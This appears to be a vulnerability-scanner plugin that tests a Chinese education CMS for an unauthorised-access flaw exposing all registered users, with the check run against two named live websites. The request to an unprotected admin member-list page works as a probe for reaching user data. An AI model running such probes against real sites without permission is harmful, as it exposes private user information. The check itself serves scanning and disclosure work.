#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:易创思教育建站系统未授权访问可查看所有注册用户
#Refer:http://www.wooyun.org/bugs/wooyun-2010-086704

def assign(service,arg):
    if service=="esccms":
        return True,arg 
    
def  audit(arg):
    url=arg+"operationmanage/selectunitmember.aspx"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and  "doPostBack" in res and 'gvUnitMember' in res:
            security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('esccms','http://www.yclfzx.com/')[1])
    audit(assign('esccms','http://www.qzxx.net/')[1])